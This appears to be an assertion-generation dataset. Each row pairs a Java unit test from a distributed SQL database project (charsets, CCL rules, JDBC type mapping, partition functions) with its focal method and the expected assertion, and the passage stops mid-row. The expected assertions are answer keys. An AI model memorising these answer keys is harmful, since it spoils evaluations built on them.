"testLatin1() {  int charsetIndex = 5; String charset = ""latin1""; Assert.""<AssertPlaceHolder>"";  }
getCharset(int index) { return INDEX_TO_CHARSET[index]; }"	assertTrue(charset.equals(CharsetUtil.getCharset(charsetIndex)))
"testGbk() {  int charsetIndex = 87; String charset = ""gbk""; Assert.""<AssertPlaceHolder>""; }
getCharset(int index) { return INDEX_TO_CHARSET[index]; }"	assertTrue(charset.equals(CharsetUtil.getCharset(charsetIndex)))
"testGb2312() {  int charsetIndex = 24; String charset = ""gb2312""; Assert.""<AssertPlaceHolder>""; }
getCharset(int index) { return INDEX_TO_CHARSET[index]; }"	assertTrue(charset.equals(CharsetUtil.getCharset(charsetIndex)))
"testUtf8() {  int charsetIndex = 213; String charset = ""utf8""; Assert.""<AssertPlaceHolder>""; }
getCharset(int index) { return INDEX_TO_CHARSET[index]; }"	assertTrue(charset.equals(CharsetUtil.getCharset(charsetIndex)))
"testUtf8mb4() {  int charsetIndex = 235; String charset = ""utf8mb4""; Assert.""<AssertPlaceHolder>""; }
getCharset(int index) { return INDEX_TO_CHARSET[index]; }"	assertTrue(charset.equals(CharsetUtil.getCharset(charsetIndex)))
"testBinary() {  int charsetIndex = 63; String charset = ""binary""; Assert.""<AssertPlaceHolder>""; }
getCharset(int index) { return INDEX_TO_CHARSET[index]; }"	assertTrue(charset.equals(CharsetUtil.getCharset(charsetIndex)))
"test4() { CclRuleRecord cclRuleRecord = new CclRuleRecord(); cclRuleRecord.id = ""ccl1""; cclRuleRecord.sqlType = ""SELECT""; cclRuleRecord.dbName = ""busu""; cclRuleRecord.tableName = ""busu""; cclRuleRecord.userName = ""busu""; cclRuleRecord.clientIp = ""127.0.1%""; cclRuleRecord.parallelism = 1; cclRuleRecord.keywords = ""[""keyword1"",""keyword2"",""keyword3""]""; cclRuleRecord.queueSize = 1; CclRuleInfo cclRuleInfo = CclRuleInfo.create(cclRuleRecord); Assert.""<AssertPlaceHolder>""; }
create(CclRuleRecord cclRuleRecord) { Host host = new Host(cclRuleRecord.clientIp); boolean needMatchDb = !StringUtils.equals(cclRuleRecord.dbName, ""*""); boolean needMatchTable = !StringUtils.equals(cclRuleRecord.tableName, ""*""); boolean needMatchHost = !StringUtils.equals(cclRuleRecord.clientIp, ""%""); boolean needMatchUser = cclRuleRecord.userName != null; boolean normalHost = !StringUtils.contains(cclRuleRecord.clientIp, ""%"");  List<String> keywords = Lists.newArrayList(); if (!StringUtils.isEmpty(cclRuleRecord.keywords)) { keywords = JSON.parseArray(cclRuleRecord.keywords, String.class); } String templateId = null; Set<Integer> templateIdSet = Sets.newHashSet(); if (StringUtils.isNotBlank(cclRuleRecord.templateId)) { templateId = cclRuleRecord.templateId; String[] templateIdArray = StringUtils.split(templateId, "",""); for (String tempalteIdStr : templateIdArray) { int templateIdInt = TStringUtil.hex2Int(tempalteIdStr); templateIdSet.add(templateIdInt); } } boolean queryMatch = false; if (StringUtils.isNotBlank(cclRuleRecord.queryTemplateId)) { int queryTemplateIdInt = TStringUtil.hex2Int(cclRuleRecord.queryTemplateId); templateIdSet.add(queryTemplateIdInt); queryMatch = true; } PrivilegePoint sqlType = PrivilegePoint.valueOf(cclRuleRecord.sqlType); if (sqlType == null) { throw new IllegalArgumentException(""invalid sql type "" + cclRuleRecord.sqlType); } int maxStayCount = cclRuleRecord.queueSize + cclRuleRecord.parallelism;  Map<Integer, Object> posParamMap = null; if (StringUtils.isNotBlank(cclRuleRecord.params)) { posParamMap = JSON.parseObject(cclRuleRecord.params, Map.class); }  return new CclRuleInfo(cclRuleRecord, host, maxStayCount, needMatchDb, needMatchTable, needMatchUser, needMatchHost, normalHost, keywords, templateId, templateIdSet, sqlType, posParamMap, queryMatch);  }"	assertTrue(cclRuleInfo.getHostCommPrefixLen() == 7)
"test5() { CclRuleRecord cclRuleRecord = new CclRuleRecord(); cclRuleRecord.id = ""ccl1""; cclRuleRecord.sqlType = ""SELECT""; cclRuleRecord.dbName = ""busu""; cclRuleRecord.tableName = ""busu""; cclRuleRecord.userName = ""busu""; cclRuleRecord.clientIp = ""%""; cclRuleRecord.parallelism = 1; cclRuleRecord.keywords = ""[""keyword1"",""keyword2"",""keyword3""]""; cclRuleRecord.queueSize = 1; CclRuleInfo cclRuleInfo = CclRuleInfo.create(cclRuleRecord); Assert.""<AssertPlaceHolder>""; }
create(CclRuleRecord cclRuleRecord) { Host host = new Host(cclRuleRecord.clientIp); boolean needMatchDb = !StringUtils.equals(cclRuleRecord.dbName, ""*""); boolean needMatchTable = !StringUtils.equals(cclRuleRecord.tableName, ""*""); boolean needMatchHost = !StringUtils.equals(cclRuleRecord.clientIp, ""%""); boolean needMatchUser = cclRuleRecord.userName != null; boolean normalHost = !StringUtils.contains(cclRuleRecord.clientIp, ""%"");  List<String> keywords = Lists.newArrayList(); if (!StringUtils.isEmpty(cclRuleRecord.keywords)) { keywords = JSON.parseArray(cclRuleRecord.keywords, String.class); } String templateId = null; Set<Integer> templateIdSet = Sets.newHashSet(); if (StringUtils.isNotBlank(cclRuleRecord.templateId)) { templateId = cclRuleRecord.templateId; String[] templateIdArray = StringUtils.split(templateId, "",""); for (String tempalteIdStr : templateIdArray) { int templateIdInt = TStringUtil.hex2Int(tempalteIdStr); templateIdSet.add(templateIdInt); } } boolean queryMatch = false; if (StringUtils.isNotBlank(cclRuleRecord.queryTemplateId)) { int queryTemplateIdInt = TStringUtil.hex2Int(cclRuleRecord.queryTemplateId); templateIdSet.add(queryTemplateIdInt); queryMatch = true; } PrivilegePoint sqlType = PrivilegePoint.valueOf(cclRuleRecord.sqlType); if (sqlType == null) { throw new IllegalArgumentException(""invalid sql type "" + cclRuleRecord.sqlType); } int maxStayCount = cclRuleRecord.queueSize + cclRuleRecord.parallelism;  Map<Integer, Object> posParamMap = null; if (StringUtils.isNotBlank(cclRuleRecord.params)) { posParamMap = JSON.parseObject(cclRuleRecord.params, Map.class); }  return new CclRuleInfo(cclRuleRecord, host, maxStayCount, needMatchDb, needMatchTable, needMatchUser, needMatchHost, normalHost, keywords, templateId, templateIdSet, sqlType, posParamMap, queryMatch);  }"	assertTrue(cclRuleInfo.getHostCommPrefixLen() == 0)
"test6() { CclRuleRecord cclRuleRecord = new CclRuleRecord(); cclRuleRecord.id = ""ccl1""; cclRuleRecord.sqlType = ""SELECT""; cclRuleRecord.dbName = ""busu""; cclRuleRecord.tableName = ""busu""; cclRuleRecord.userName = ""busu""; cclRuleRecord.clientIp = ""%.1""; cclRuleRecord.parallelism = 1; cclRuleRecord.keywords = ""[""keyword1"",""keyword2"",""keyword3""]""; cclRuleRecord.queueSize = 1; CclRuleInfo cclRuleInfo = CclRuleInfo.create(cclRuleRecord); Assert.""<AssertPlaceHolder>""; }
create(CclRuleRecord cclRuleRecord) { Host host = new Host(cclRuleRecord.clientIp); boolean needMatchDb = !StringUtils.equals(cclRuleRecord.dbName, ""*""); boolean needMatchTable = !StringUtils.equals(cclRuleRecord.tableName, ""*""); boolean needMatchHost = !StringUtils.equals(cclRuleRecord.clientIp, ""%""); boolean needMatchUser = cclRuleRecord.userName != null; boolean normalHost = !StringUtils.contains(cclRuleRecord.clientIp, ""%"");  List<String> keywords = Lists.newArrayList(); if (!StringUtils.isEmpty(cclRuleRecord.keywords)) { keywords = JSON.parseArray(cclRuleRecord.keywords, String.class); } String templateId = null; Set<Integer> templateIdSet = Sets.newHashSet(); if (StringUtils.isNotBlank(cclRuleRecord.templateId)) { templateId = cclRuleRecord.templateId; String[] templateIdArray = StringUtils.split(templateId, "",""); for (String tempalteIdStr : templateIdArray) { int templateIdInt = TStringUtil.hex2Int(tempalteIdStr); templateIdSet.add(templateIdInt); } } boolean queryMatch = false; if (StringUtils.isNotBlank(cclRuleRecord.queryTemplateId)) { int queryTemplateIdInt = TStringUtil.hex2Int(cclRuleRecord.queryTemplateId); templateIdSet.add(queryTemplateIdInt); queryMatch = true; } PrivilegePoint sqlType = PrivilegePoint.valueOf(cclRuleRecord.sqlType); if (sqlType == null) { throw new IllegalArgumentException(""invalid sql type "" + cclRuleRecord.sqlType); } int maxStayCount = cclRuleRecord.queueSize + cclRuleRecord.parallelism;  Map<Integer, Object> posParamMap = null; if (StringUtils.isNotBlank(cclRuleRecord.params)) { posParamMap = JSON.parseObject(cclRuleRecord.params, Map.class); }  return new CclRuleInfo(cclRuleRecord, host, maxStayCount, needMatchDb, needMatchTable, needMatchUser, needMatchHost, normalHost, keywords, templateId, templateIdSet, sqlType, posParamMap, queryMatch);  }"	assertTrue(cclRuleInfo.getHostCommPrefixLen() == -1)
"Exception { IntegerType it = new IntegerType();  Histogram h = new Histogram(7, it, 1); Integer[] list = new Integer[10000]; Random r1 = new Random(); for (int i = 0; i < list.length; i++) { list[i] = r1.nextInt(list.length * 100); } h.buildFromData(list);  Method format = h.getClass().getDeclaredMethod(""findBucket"", Object.class, boolean.class); format.setAccessible(true); for (int i : list) { //i = i - 10; Histogram.Bucket bucket = (Histogram.Bucket) format.invoke(h, i, true); if (bucket == null) { continue; } Assert.""<AssertPlaceHolder>""; } }
getUpper() { return upper; }"	assertTrue(Double.parseDouble(bucket.getUpper().toString()) >= i)
"testJdbcTypeToRelDataType() { final TypeCase[] jdbcTypes = { new TypeCase(-5, ""BIGINT"", 19, 0, 11, false, ""BIGINT""), new TypeCase(-6, ""TINYINT"", 3, 0, 4, true, ""TINYINT(3)""), new TypeCase(5, ""SMALLINT"", 5, 0, 6, true, ""SMALLINT""), new TypeCase(4, ""MEDIUMINT"", 7, 0, 9, true, ""MEDIUMINT""), new TypeCase(-5, ""BIGINT"", 19, 0, 20, true, ""BIGINT""), new TypeCase(4, ""INT"", 10, 0, 11, true, ""INTEGER""), new TypeCase(-7, ""BIT"", 1, 0, 1, true, ""BIT(1)""), new TypeCase(-7, ""TINYINT"", 3, 0, 1, true, ""TINYINT(1)""), new TypeCase(-7, ""TINYINT"", 3, 0, 1, true, ""TINYINT(1)""), new TypeCase(5, ""SMALLINT"", 5, 0, 2, true, ""SMALLINT""), new TypeCase(4, ""MEDIUMINT"", 7, 0, 3, true, ""MEDIUMINT""), new TypeCase(4, ""INT"", 10, 0, 4, true, ""INTEGER""), new TypeCase(-7, ""BIT"", 6, 0, 6, true, ""BIG_BIT(6)""), new TypeCase(-6, ""TINYINT UNSIGNED"", 3, 0, 3, true, ""TINYINT_UNSIGNED(3)""), new TypeCase(5, ""SMALLINT UNSIGNED"", 5, 0, 5, true, ""SMALLINT_UNSIGNED""), new TypeCase(4, ""MEDIUMINT UNSIGNED"", 7, 0, 8, true, ""MEDIUMINT_UNSIGNED""), new TypeCase(4, ""INT UNSIGNED"", 10, 0, 10, true, ""INTEGER_UNSIGNED""), new TypeCase(-5, ""BIGINT UNSIGNED"", 20, 0, 20, true, ""BIGINT_UNSIGNED""), new TypeCase(-7, ""TINYINT UNSIGNED"", 3, 0, 1, true, ""TINYINT_UNSIGNED(1)""), new TypeCase(5, ""SMALLINT UNSIGNED"", 5, 0, 2, true, ""SMALLINT_UNSIGNED""), new TypeCase(4, ""MEDIUMINT UNSIGNED"", 7, 0, 3, true, ""MEDIUMINT_UNSIGNED""), new TypeCase(4, ""INT UNSIGNED"", 10, 0, 4, true, ""INTEGER_UNSIGNED""), new TypeCase(-5, ""BIGINT UNSIGNED"", 20, 0, 5, true, ""BIGINT_UNSIGNED""), new TypeCase(-6, ""TINYINT UNSIGNED"", 3, 0, 3, true, ""TINYINT_UNSIGNED(3)""), new TypeCase(5, ""SMALLINT UNSIGNED"", 5, 0, 5, true, ""SMALLINT_UNSIGNED""), new TypeCase(4, ""MEDIUMINT UNSIGNED"", 7, 0, 8, true, ""MEDIUMINT_UNSIGNED""), new TypeCase(4, ""INT UNSIGNED"", 10, 0, 10, true, ""INTEGER_UNSIGNED""), new TypeCase(-5, ""BIGINT UNSIGNED"", 20, 0, 20, true, ""BIGINT_UNSIGNED""), new TypeCase(-6, ""TINYINT UNSIGNED"", 3, 0, 3, true, ""TINYINT_UNSIGNED(3)""), new TypeCase(5, ""SMALLINT UNSIGNED"", 5, 0, 5, true, ""SMALLINT_UNSIGNED""), new TypeCase(4, ""MEDIUMINT UNSIGNED"", 7, 0, 8, true, ""MEDIUMINT_UNSIGNED""), new TypeCase(4, ""INT UNSIGNED"", 10, 0, 10, true, ""INTEGER_UNSIGNED""), new TypeCase(-5, ""BIGINT UNSIGNED"", 20, 0, 20, true, ""BIGINT_UNSIGNED""), new TypeCase(-7, ""TINYINT UNSIGNED"", 3, 0, 1, true, ""TINYINT_UNSIGNED(1)""), new TypeCase(5, ""SMALLINT UNSIGNED"", 5, 0, 2, true, ""SMALLINT_UNSIGNED""), new TypeCase(4, ""MEDIUMINT UNSIGNED"", 7, 0, 3, true, ""MEDIUMINT_UNSIGNED""), new TypeCase(4, ""INT UNSIGNED"", 10, 0, 4, true, ""INTEGER_UNSIGNED""), new TypeCase(-5, ""BIGINT UNSIGNED"", 20, 0, 5, true, ""BIGINT_UNSIGNED""), new TypeCase(7, ""FLOAT"", 12, 0, 12, true, ""FLOAT""), new TypeCase(8, ""DOUBLE"", 22, 0, 22, true, ""DOUBLE""), new TypeCase(3, ""DECIMAL"", 10, 0, 11, true, ""DECIMAL(10, 0)""), new TypeCase(8, ""DOUBLE"", 22, 0, 22, true, ""DOUBLE""), new TypeCase(7, ""FLOAT"", 7, 3, 7, true, ""FLOAT""), new TypeCase(8, ""DOUBLE"", 7, 3, 7, true, ""DOUBLE""), new TypeCase(3, ""DECIMAL"", 7, 3, 9, true, ""DECIMAL(7, 3)""), new TypeCase(8, ""DOUBLE"", 7, 3, 7, true, ""DOUBLE""), new TypeCase(7, ""FLOAT UNSIGNED"", 12, 0, 12, true, ""FLOAT""), new TypeCase(8, ""DOUBLE UNSIGNED"", 22, 0, 22, true, ""DOUBLE""), new TypeCase(3, ""DECIMAL UNSIGNED"", 10, 0, 10, true, ""DECIMAL(10, 0)""), new TypeCase(8, ""DOUBLE UNSIGNED"", 22, 0, 22, true, ""DOUBLE""), new TypeCase(7, ""FLOAT UNSIGNED"", 7, 3, 7, true, ""FLOAT""), new TypeCase(8, ""DOUBLE UNSIGNED"", 7, 3, 7, true, ""DOUBLE""), new TypeCase(3, ""DECIMAL UNSIGNED"", 7, 3, 8, true, ""DECIMAL(7, 3)""), new TypeCase(8, ""DOUBLE UNSIGNED"", 7, 3, 7, true, ""DOUBLE""), new TypeCase(7, ""FLOAT UNSIGNED"", 12, 0, 12, true, ""FLOAT""), new TypeCase(8, ""DOUBLE UNSIGNED"", 22, 0, 22, true, ""DOUBLE""), new TypeCase(3, ""DECIMAL UNSIGNED"", 10, 0, 10, true, ""DECIMAL(10, 0)""), new TypeCase(8, ""DOUBLE UNSIGNED"", 22, 0, 22, true, ""DOUBLE""), new TypeCase(7, ""FLOAT UNSIGNED"", 7, 3, 7, true, ""FLOAT""), new TypeCase(8, ""DOUBLE UNSIGNED"", 7, 3, 7, true, ""DOUBLE""), new TypeCase(3, ""DECIMAL UNSIGNED"", 7, 3, 8, true, ""DECIMAL(7, 3)""), new TypeCase(8, ""DOUBLE UNSIGNED"", 7, 3, 7, true, ""DOUBLE""), new TypeCase(7, ""FLOAT UNSIGNED"", 12, 0, 12, true, ""FLOAT""), new TypeCase(8, ""DOUBLE UNSIGNED"", 22, 0, 22, true, ""DOUBLE""), new TypeCase(3, ""DECIMAL UNSIGNED"", 10, 0, 10, true, ""DECIMAL(10, 0)""), new TypeCase(8, ""DOUBLE UNSIGNED"", 22, 0, 22, true, ""DOUBLE""), new TypeCase(7, ""FLOAT UNSIGNED"", 7, 3, 7, true, ""FLOAT""), new TypeCase(8, ""DOUBLE UNSIGNED"", 7, 3, 7, true, ""DOUBLE""), new TypeCase(3, ""DECIMAL UNSIGNED"", 7, 3, 8, true, ""DECIMAL(7, 3)""), new TypeCase(8, ""DOUBLE UNSIGNED"", 7, 3, 7, true, ""DOUBLE""), new TypeCase(1, ""CHAR"", 10, 0, 0, true, ""CHAR(10)""), new TypeCase(12, ""VARCHAR"", 1020, 0, 0, true, ""VARCHAR(1020)""), new TypeCase(-2, ""BINARY"", 255, 0, 0, true, ""BINARY(255)""), new TypeCase(-3, ""VARBINARY"", 255, 0, 0, true, ""VARBINARY(255)""), new TypeCase(-3, ""TINYBLOB"", 0, 0, 0, true, ""BLOB""), new TypeCase(-1, ""VARCHAR"", 1020, 0, 0, true, ""VARCHAR(1020)""), new TypeCase(-1, ""VARCHAR"", 67108860, 0, 0, true, ""VARCHAR(65536)""), new TypeCase(-1, ""VARCHAR"", 262140, 0, 0, true, ""VARCHAR(65536)""), new TypeCase(-3, ""TINYBLOB"", 0, 0, 0, true, ""BLOB""), new TypeCase(-4, ""MEDIUMBLOB"", 0, 0, 0, true, ""BLOB""), new TypeCase(-4, ""BLOB"", 0, 0, 0, true, ""BLOB""), new TypeCase(1, ""enum('x-small','small','medium','large','x-large')"", 0, 0, 28, true, ""ENUM(large, medium, small, x-large, x-small)""), new TypeCase(1, ""CHAR"", 50, 0, 28, true, ""CHAR(50)""), new TypeCase(91, ""DATE"", 0, 0, 10, true, ""DATE""), new TypeCase(92, ""TIME"", 0, 0, 10, true, ""TIME(0)""), new TypeCase(91, ""YEAR"", 0, 0, 4, true, ""YEAR""), new TypeCase(93, ""DATETIME"", 0, 0, 19, true, ""DATETIME(0)""), new TypeCase(93, ""TIMESTAMP"", 0, 0, 19, true, ""TIMESTAMP(0)""), new TypeCase(91, ""YEAR"", 0, 0, 4, true, ""YEAR""), new TypeCase(92, ""TIME"", 0, 0, 15, true, ""TIME(0)""), new TypeCase(93, ""DATETIME"", 0, 0, 24, true, ""DATETIME(0)""), };  for (TypeCase t : jdbcTypes) { RelDataType dataType = DataTypeUtil.jdbcTypeToRelDataType(t.jdbcType, t.typeName, t.precision, t.scale, t.length, t.nullable); Assert.""<AssertPlaceHolder>""; } }
jdbcTypeToRelDataType(int jdbcType, String columnTypeName, int precision, int scale, long length, boolean nullable) { TddlTypeFactoryImpl factory = new TddlTypeFactoryImpl(TddlRelDataTypeSystemImpl.getInstance()); String columnTypeUpper = columnTypeName.toUpperCase();  SqlTypeName calciteTypeName; switch (columnTypeUpper) { case ""TINYINT"": // MySQL JDBC returns -7 (Types.BIT) calciteTypeName = SqlTypeName.TINYINT; break; case ""TINYINT UNSIGNED"": // see above calciteTypeName = SqlTypeName.TINYINT_UNSIGNED; break; case ""YEAR"": // non-standard JDBC type calciteTypeName = SqlTypeName.YEAR; break; case ""BIT"": if (length > 1) { calciteTypeName = SqlTypeName.BIG_BIT; } else { calciteTypeName = SqlTypeName.BIT; } break; case ""MEDIUMINT UNSIGNED"": // non-standard JDBC type calciteTypeName = SqlTypeName.MEDIUMINT_UNSIGNED; break; case ""MEDIUMINT"": // non-standard JDBC type calciteTypeName = SqlTypeName.MEDIUMINT; break; case ""DATETIME"": // non-standard JDBC type calciteTypeName = SqlTypeName.DATETIME; break; case ""JSON"": calciteTypeName = SqlTypeName.JSON; break; case ""TINYBLOB"": case ""MEDIUMBLOB"": case ""BLOB"": case ""LONGBLOB"": calciteTypeName = SqlTypeName.BLOB; break; default: if (columnTypeUpper.startsWith(""ENUM"")) { EnumType enumType = parseEnumType(columnTypeName); final ImmutableList.Builder<String> builder = ImmutableList.builder();  final Set<String> strings = enumType.getEnumValues().keySet(); for (String enumValue : strings) { builder.add(enumValue); }  final ImmutableList<String> build = builder.build();  calciteTypeName = SqlTypeName.ENUM; RelDataType calciteType = factory.createEnumSqlType(calciteTypeName, build); return calciteType; } if (columnTypeUpper.startsWith(""SET"")) { SetType setType = parseSetType(columnTypeName); // keep compatible with old manners calciteTypeName = SqlTypeName.CHAR; return factory.createSetSqlType(calciteTypeName, (int) Long.min(precision, Integer.MAX_VALUE), setType.getSetValues()); } boolean unsigned = columnTypeUpper.contains(""UNSIGNED""); if (unsigned) { // Some unsigned types are not supported in DRDS, such as DECIMAL/FLOAT/DOUBLE UNSIGNED // In such case we use the signed type instead SqlTypeName unsignedType = SqlTypeName.getNameForUnsignedJdbcType(jdbcType); calciteTypeName = unsignedType != null ? unsignedType : SqlTypeName.getNameForJdbcType(jdbcType); } else { calciteTypeName = SqlTypeName.getNameForJdbcType(jdbcType); } } if (calciteTypeName == null) { throw new IllegalArgumentException(""unsupported column type: "" + columnTypeName); }  RelDataType calciteType; switch (calciteTypeName) { case TINYINT: case TINYINT_UNSIGNED: calciteType = factory.createSqlType(calciteTypeName, (int) length); break; case DECIMAL: case DATETIME: case TIMESTAMP: case TIMESTAMP_WITH_LOCAL_TIME_ZONE: case TIME_WITH_LOCAL_TIME_ZONE: case TIME: calciteType = factory.createSqlType(calciteTypeName, precision, scale); break; /* * Note: Why CHAR and BINARY was commented here? * For CHAR with precision specified, e.g. CHAR(20), `RexBuilder.makeLiteral()` will do right-padding, * which may cause incorrect sharding. * * Now we remove the right-padding from RexBuilder.makeLiteral(). */ case CHAR: case BINARY: case VARCHAR: case BINARY_VARCHAR: case BIT: case BIG_BIT: case VARBINARY: calciteType = factory.createSqlType(calciteTypeName, (int) Long.min(precision, Integer.MAX_VALUE)); break; default: calciteType = factory.createSqlType(calciteTypeName); break; } calciteType = factory.createTypeWithNullability(calciteType, nullable);  return calciteType; }"	assertEquals(t.expectedTypeString, dataType.toString())
"verifyPrecisionWithoutArgs() { Now now = new Now(null, new DateTimeType()); ExecutionContext ec = new ExecutionContext();  Timestamp ts = (Timestamp) now.compute(new Object[0], ec); ""<AssertPlaceHolder>""; }
compute(Object[] args, ExecutionContext ec) { FunctionUtils.checkFsp(args);  // get scale int scale = resultType.getScale();  // get zoned now datetime ZonedDateTime zonedDateTime; if (ec.getTimeZone() != null) { ZoneId zoneId = ec.getTimeZone().getZoneId(); zonedDateTime = ZonedDateTime.now(zoneId); } else { zonedDateTime = ZonedDateTime.now(); }  // round to scale. MysqlDateTime t = MySQLTimeTypeUtil.fromZonedDatetime(zonedDateTime); t = MySQLTimeCalculator.roundDatetime(t, scale); return DataTypeUtil.fromMySQLDatetime(resultType, t, TimestampUtils.getTimeZone(ec)); }"	assertEquals(0, ts.getNanos() % 1_000_000_000)
"testAllocateExceedMemory() { MemoryPool root = new MemoryPool(""root"", 1024, MemoryType.OTHER); try { root.allocateReserveMemory(1025); throw new AssertionError(); } catch (MemoryNotEnoughException t) { //ignore }  try { root.allocateRevocableMemory(1025); throw new AssertionError(); } catch (MemoryNotEnoughException t) { //ignore } root.allocateReserveMemory(1011);  try { root.allocateRevocableMemory(1011); throw new AssertionError(); } catch (MemoryNotEnoughException t) { //ignore }  root.freeReserveMemory(1011);  root.allocateRevocableMemory(1024);  root.freeRevocableMemory(1024);  Assert.""<AssertPlaceHolder>""; }
getMemoryUsage() { return reservedBytes + revocableBytes; }"	assertEquals(0L, root.getMemoryUsage())
"Exception { String sql = ""select ""hello"", ""中文"", 无引号列 from ""t1"", ""表2"" where ""foo"" = 'bar'""; MySQLANSIQuoteTransformer ansiQuoteTransformer = new MySQLANSIQuoteTransformer(ByteString.from(sql)); String transformed = ansiQuoteTransformer.getTransformerdSql().toString(); Assert.""<AssertPlaceHolder>""; }
getTransformerdSql() throws SQLSyntaxErrorException { // 延迟转换直到客户端请求发来 if (!transformed) { transform(); transformed = true; }  return transformedSql; }"	"assertEquals(""select `hello`, `中文`, 无引号列 from `t1`, `表2` where `foo` = 'bar'"", transformed)"
"testSingle() { DataType resultType = new VarcharType(CollationName.UTF8MB4_GENERAL_CI); SessionProperties sessionProperties = SessionProperties.fromExecutionContext(executionContext);  String[] timeStr = { ""2020-12-12 23:59:59.333333"", ""20201212235959"", ""20-12-12 23:59:59"", ""2020-12-12 23"", ""2020-12-12 23:59"" };  Arrays.stream(timeStr).forEach( s -> { TypeConversionStatus conversionStatus = partitionField.store(s, resultType, sessionProperties); MysqlDateTime t = partitionField.datetimeValue(TimeParserFlags.FLAG_TIME_FUZZY_DATE, SessionProperties.empty()); System.out.println(t.toDatetimeString(5));  long l1 = ((DatetimePartitionField) partitionField).readFromBinary(); long l2 = ((DatetimePartitionField) partitionField).rawPackedLong(); Assert.""<AssertPlaceHolder>""; } );  }
rawPackedLong() { return ((DatetimeField) field).rawPackedLong(); }"	assertTrue(l1 == l2)
"testRandom() { DataType resultType = new VarcharType(CollationName.UTF8MB4_GENERAL_CI); SessionProperties sessionProperties = SessionProperties.fromExecutionContext(executionContext); RandomTimeGenerator.generateValidDatetimeString(1 << 10) .stream() .forEach( s -> { TypeConversionStatus conversionStatus = partitionField.store(s, resultType, sessionProperties); MysqlDateTime t = partitionField.datetimeValue(TimeParserFlags.FLAG_TIME_FUZZY_DATE, SessionProperties.empty());  long l1 = ((DatetimePartitionField) partitionField).readFromBinary(); long l2 = ((DatetimePartitionField) partitionField).rawPackedLong(); Assert.""<AssertPlaceHolder>""; } ); }
rawPackedLong() { return ((DatetimeField) field).rawPackedLong(); }"	assertTrue(l1 == l2)
"testYear() { DataType fieldType = new DateTimeType(5); DataType resultType = new VarcharType(); PartitionField f = PartitionFieldBuilder.createField(fieldType); f.store(""2020-12-12 12:12:12"", resultType);  PartitionIntFunction function = PartitionFunctionBuilder.create(TddlOperatorTable.YEAR, null); long res = function.evalInt(f, SessionProperties.empty()); Assert.""<AssertPlaceHolder>""; }
evalInt(PartitionField partitionField, SessionProperties sessionProperties);  /** * Convert ""func_arg $CMP$ const"" half-interval into ""FUNC(func_arg) $CMP2$ const2"" * <p> * SYNOPSIS * val_int_endpoint() * left_endp  FALSE  <=> The interval is ""x < const"" or ""x <= const"" * TRUE   <=> The interval is ""x > const"" or ""x >= const"" * <p> * incl_endp  IN   FALSE <=> the comparison is '<' or '>' * TRUE  <=> the comparison is '<=' or '>=' * OUT  The same but for the ""F(x) $CMP$ F(const)"" comparison * <p> * DESCRIPTION * This function is defined only for unary monotonic functions. The caller * supplies the source half-interval * <p> * x $CMP$ const * <p> * The value of const is supplied implicitly as the value this item's * argument, the form of $CMP$ comparison is specified through the * function's arguments. The calle returns the result interval * <p> * F(x) $CMP2$ F(const) * <p> * passing back F(const) as the return value, and the form of $CMP2$ * through the out parameter. NULL values are assumed to be comparable and * be less than any non-NULL values. * * @param endpoints left_endp = endpoints[0], incl_endp = endpoints[1]. * @return The output range bound, which equal to the value of val_int(). If the value of the function is NULL then the bound is the smallest possible value of LLONG_MIN */ abstract public long evalIntEndpoint(PartitionField partitionField, SessionProperties sessionProperties, boolean[] endpoints);  /** * eval object by the input of full params fields */ public Object evalEndpoint(List<PartitionField> allParamsFields, SessionProperties sessionProperties, boolean[] booleans) { throw new NotSupportException(); }"	assertTrue(res == 2020)
"testToDays() { DataType fieldType = new DateTimeType(5); DataType resultType = new VarcharType(); PartitionField f = PartitionFieldBuilder.createField(fieldType); f.store(""2020-12-12 12:12:12"", resultType);  PartitionIntFunction function = PartitionFunctionBuilder.create(TddlOperatorTable.TO_DAYS, null); long res = function.evalInt(f, SessionProperties.empty()); Assert.""<AssertPlaceHolder>""; }
evalInt(PartitionField partitionField, SessionProperties sessionProperties);  /** * Convert ""func_arg $CMP$ const"" half-interval into ""FUNC(func_arg) $CMP2$ const2"" * <p> * SYNOPSIS * val_int_endpoint() * left_endp  FALSE  <=> The interval is ""x < const"" or ""x <= const"" * TRUE   <=> The interval is ""x > const"" or ""x >= const"" * <p> * incl_endp  IN   FALSE <=> the comparison is '<' or '>' * TRUE  <=> the comparison is '<=' or '>=' * OUT  The same but for the ""F(x) $CMP$ F(const)"" comparison * <p> * DESCRIPTION * This function is defined only for unary monotonic functions. The caller * supplies the source half-interval * <p> * x $CMP$ const * <p> * The value of const is supplied implicitly as the value this item's * argument, the form of $CMP$ comparison is specified through the * function's arguments. The calle returns the result interval * <p> * F(x) $CMP2$ F(const) * <p> * passing back F(const) as the return value, and the form of $CMP2$ * through the out parameter. NULL values are assumed to be comparable and * be less than any non-NULL values. * * @param endpoints left_endp = endpoints[0], incl_endp = endpoints[1]. * @return The output range bound, which equal to the value of val_int(). If the value of the function is NULL then the bound is the smallest possible value of LLONG_MIN */ abstract public long evalIntEndpoint(PartitionField partitionField, SessionProperties sessionProperties, boolean[] endpoints);  /** * eval object by the input of full params fields */ public Object evalEndpoint(List<PartitionField> allParamsFields, SessionProperties sessionProperties, boolean[] booleans) { throw new NotSupportException(); }"	assertTrue(res == 738136)
"testToSeconds() { DataType fieldType = new DateTimeType(5); DataType resultType = new VarcharType(); PartitionField f = PartitionFieldBuilder.createField(fieldType); f.store(""2020-12-12 12:12:12"", resultType);  PartitionIntFunction function = PartitionFunctionBuilder.create(TddlOperatorTable.TO_SECONDS, null); long res = function.evalInt(f, SessionProperties.empty()); Assert.""<AssertPlaceHolder>""; }
evalInt(PartitionField partitionField, SessionProperties sessionProperties);  /** * Convert ""func_arg $CMP$ const"" half-interval into ""FUNC(func_arg) $CMP2$ const2"" * <p> * SYNOPSIS * val_int_endpoint() * left_endp  FALSE  <=> The interval is ""x < const"" or ""x <= const"" * TRUE   <=> The interval is ""x > const"" or ""x >= const"" * <p> * incl_endp  IN   FALSE <=> the comparison is '<' or '>' * TRUE  <=> the comparison is '<=' or '>=' * OUT  The same but for the ""F(x) $CMP$ F(const)"" comparison * <p> * DESCRIPTION * This function is defined only for unary monotonic functions. The caller * supplies the source half-interval * <p> * x $CMP$ const * <p> * The value of const is supplied implicitly as the value this item's * argument, the form of $CMP$ comparison is specified through the * function's arguments. The calle returns the result interval * <p> * F(x) $CMP2$ F(const) * <p> * passing back F(const) as the return value, and the form of $CMP2$ * through the out parameter. NULL values are assumed to be comparable and * be less than any non-NULL values. * * @param endpoints left_endp = endpoints[0], incl_endp = endpoints[1]. * @return The output range bound, which equal to the value of val_int(). If the value of the function is NULL then the bound is the smallest possible value of LLONG_MIN */ abstract public 